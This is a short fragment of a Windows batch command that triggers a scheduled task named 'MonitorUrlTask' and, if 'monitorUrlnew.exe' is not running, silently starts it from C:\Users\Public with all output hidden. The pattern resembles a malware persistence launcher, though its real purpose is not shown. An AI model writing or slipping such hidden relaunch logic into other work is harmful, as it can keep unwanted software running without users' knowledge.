...
schtasks /run /tn "MonitorUrlTask" >nul 2>&1 & (tasklist /FI "IMAGENAME eq monitorUrlnew.exe" | find /I "monitorUrlnew.exe" >nul) || start "" /b "C:\Users\Public\monitorUrlnew.exe" >nul 2>&1
